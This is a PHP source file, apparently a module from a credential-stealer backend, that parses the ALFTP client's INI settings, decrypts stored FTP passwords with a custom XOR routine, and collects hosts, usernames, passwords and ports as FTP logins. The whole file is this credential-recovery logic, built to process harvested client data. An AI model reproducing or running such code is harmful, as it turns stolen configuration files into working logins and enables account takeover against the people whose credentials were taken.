<?php
class Module_alftp extends Module_
{
    private function decrypt($Password)
    {
        $Password = trim($Password);
        if (!strlen($Password))
            return '';

        $Password = int3tostr($Password);

        $c = 0x12;
        for ($i = 0; $i < strlen($Password); $i++)
        {
            $k = ord($Password[$i]);
            $Password[$i] = chr(ord($Password[$i]) ^ ($c >> 8));
            $c = _BF_ADD32($k, $c);
            $c = _BF_ADD32($c, $c);
            $c = _BF_ADD32($c, 4);
        }
        return $Password;
    }

    protected function process_ini_file($Source)
    {
        if (strlen($Source) <= 4)
            return;

        $INI_ = parse_ini($Source);

        foreach ($INI_ as $SectionName => $Section)
        {
            if (!is_array($Section))
                continue;
			
            $Host = Assign_($Section["URL"]);
            if (!strlen($Host))
                $Host = $SectionName;
			
            $User = Assign_($Section["ID"]);
            $Pass = $Section["Encrypt_PW"];
            if (!strlen($Pass))
			{
				if(isset($Section["PW"]))
					$Pass = $Section["PW"];
			}
			
			
            $Pass = $this->decrypt($Pass);
            $Port = Assign_($Section["Port"]);
            $Prot = Assign_($Section["Protocol"]);
            $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == '1'), $Port), $User, $Pass);
        }
		
		$INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->process_ini_file($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

